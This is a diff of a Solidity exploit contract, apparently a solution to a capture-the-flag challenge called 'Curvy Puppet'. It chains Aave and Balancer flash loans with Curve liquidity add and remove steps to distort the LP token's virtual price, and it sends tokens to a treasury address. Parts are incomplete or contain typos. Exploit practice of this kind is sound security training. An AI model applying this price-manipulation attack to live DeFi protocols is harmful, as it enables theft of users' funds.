@@ -242,7 +242,7 @@ contract AttackCurvyPuppet {
         dvt = _dvt;
     }
     function manipulateCurvePool() public {
-        // add liquidity to the pool
+        // step 1: add liquidity to the pool
         weth.withdraw(58685 ether);
         
         console.log("LP token price before removing liquidity", curvePool.get_virtual_price());
@@ -261,15 +261,60 @@ contract AttackCurvyPuppet {
     }
 
     function removeLiquidity() public {
-        
+        // step 2: remove liquidity from the pool
+        uint256[2] memory min_amounts = [uint256(0), uint256(0)];
+        uint256 lpBalance = curveLpToken.balanceOf(address(this));
+
+        curvePool.remove_liquidity(lpBalance - 300000000000000000, min_amounts);
+
+        console.log("LP token price after2 removing liquidity", curvePool.get_virtual_price());
     }
 
     function attack() public {
+        // Allow leanding pool to pull collateral
+        IERC20(curvePool.lpToken()).approve(address(permit2), type(uint256).max);
 
+        permit2.apporve({
+            token: curvePool.lpToken(),
+            spender: address(lending),
+            amount: 5e18,
+            expiration: uint48(block.timestamp)
+        });
+        stETH.approve(address(AaveV2), type(uint256).max);
+        weth.approve(address(AaveV2), type(uint256).max);
+
+        address[] memory assets = new address[](2);
+        assets[0] = address(stETH);
+        assets[1] = address(weth);
+        uint256[] memory amounts = new uint256[](2);
+        amounts[0] = 172000 * 1e18;
+        amounts[1] = 20500 * 1e18;
+        uint256[] memory modes = new uint256[](2);
+        modes[0] = 0;
+        modes[1] = 0;
+
+        AaveV2.flashloan(address(this), assets, amounts, modes, address(this), bytes(""), 0);
+        weth.transfer(treasury, weth.balanceOf(address(this)));
+        curveLpToken.transfer(treasury, 1);
+        dvt.transfer(treasury, 7500e18);
     }
 
-    function executeOperation() external returns(bool) {
-
+    function executeOperation(
+        address[] memory assets,
+        uint256[] memory amounts,
+        uint256[] memory premiums,
+        address initiator,
+        bytes memory params
+    ) external returns(bool) {
+        console.log("AAVE flashloan stETH balance:", stETH.balanceOf(address(this)));
+        console.log("wETH balancer:", weth.balanceOf(address(Balancer)));
+        address[] memory tokens = new address[](1);
+        tokens[0] = address(weth);
+        uint256[] memory amounts = new uint256[](1);
+        amounts[0] = 37991 ether;
+        bytes memory userData = "";
+        Balancer.flashLoan(address(this), tokens, amounts, userData);
+        return true;
     }
 
     function receiveFlashloan() external {
